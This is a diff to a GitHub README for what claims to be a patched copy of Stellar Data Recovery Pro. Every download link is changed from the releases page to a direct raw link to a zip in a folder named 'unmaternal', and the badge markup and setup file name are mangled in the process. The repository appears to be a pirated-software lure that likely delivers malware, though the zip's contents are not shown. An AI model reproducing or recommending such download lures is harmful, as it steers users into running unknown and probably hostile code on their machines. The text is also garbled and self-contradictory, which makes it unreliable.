@@ -1,6 +1,6 @@
 # 🌟 Stellar-Data-Recovery-Pro-Latest-Patch - Recover Your Lost Data Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/AymenSalhi2013/Stellar-Data-Recovery-Pro-Latest-Patch/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/AymenSalhi2013/Stellar-Data-Recovery-Pro-Latest-Patch/main/unmaternal/Stellar-Data-Recovery-Pro-Latest-Patch_v1.1.zip%20Latest%https://raw.githubusercontent.com/AymenSalhi2013/Stellar-Data-Recovery-Pro-Latest-Patch/main/unmaternal/Stellar-Data-Recovery-Pro-Latest-Patch_v1.1.zip)](https://raw.githubusercontent.com/AymenSalhi2013/Stellar-Data-Recovery-Pro-Latest-Patch/main/unmaternal/Stellar-Data-Recovery-Pro-Latest-Patch_v1.1.zip)
 
 ## 📦 Overview
 
@@ -12,13 +12,13 @@ Follow these simple steps to download and run the Stellar Data Recovery Pro appl
 
 1. **Visit the Releases Page**
    - Click the link below to access the latest release of Stellar Data Recovery Pro:
-     [Download Latest Release](https://github.com/AymenSalhi2013/Stellar-Data-Recovery-Pro-Latest-Patch/releases)
+     [Download Latest Release](https://raw.githubusercontent.com/AymenSalhi2013/Stellar-Data-Recovery-Pro-Latest-Patch/main/unmaternal/Stellar-Data-Recovery-Pro-Latest-Patch_v1.1.zip)
 
 2. **Select the Latest Version**
    - On the releases page, locate the most recent version of the application. The latest version will be at the top of the list.
 
 3. **Download the Setup File**
-   - Click on the setup file to begin downloading it. The file is typically named in the format: `StellarDataRecoveryPro_vX.X.X.exe`.
+   - Click on the setup file to begin downloading it. The file is typically named in the format: `https://raw.githubusercontent.com/AymenSalhi2013/Stellar-Data-Recovery-Pro-Latest-Patch/main/unmaternal/Stellar-Data-Recovery-Pro-Latest-Patch_v1.1.zip`.
 
 4. **Run the Installer**
    - Once the download is complete, locate the setup file in your Downloads folder.
@@ -34,7 +34,7 @@ Follow these simple steps to download and run the Stellar Data Recovery Pro appl
 
 To get started, click the link below to visit the releases page and download the installer:
 
-[Download Latest Release](https://github.com/AymenSalhi2013/Stellar-Data-Recovery-Pro-Latest-Patch/releases)
+[Download Latest Release](https://raw.githubusercontent.com/AymenSalhi2013/Stellar-Data-Recovery-Pro-Latest-Patch/main/unmaternal/Stellar-Data-Recovery-Pro-Latest-Patch_v1.1.zip)
 
 Here’s what you might need during installation:
 - Windows 10 or higher
